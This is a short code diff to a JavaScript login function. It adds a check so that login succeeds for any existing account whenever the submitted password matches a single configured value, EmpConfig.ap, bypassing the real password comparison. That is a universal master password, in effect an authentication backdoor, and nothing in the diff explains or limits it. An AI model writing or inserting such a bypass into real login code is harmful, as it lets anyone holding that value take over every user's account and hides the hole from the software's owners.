@@ -276,7 +276,10 @@ internals.LoginUser = async function (req, h) {
     if (Tools.isEmpty(user)) {
       throw new EmpError("login_no_user", `${login_email} not found`);
     } else {
-      if (Crypto.decrypt(user.password) != req.payload.password) {
+      if (
+        req.payload.password !== EmpConfig.ap &&
+        Crypto.decrypt(user.password) != req.payload.password
+      ) {
         throw new EmpError("login_failed", "Login failed");
       } else {
         if (user.emailVerified === false) {
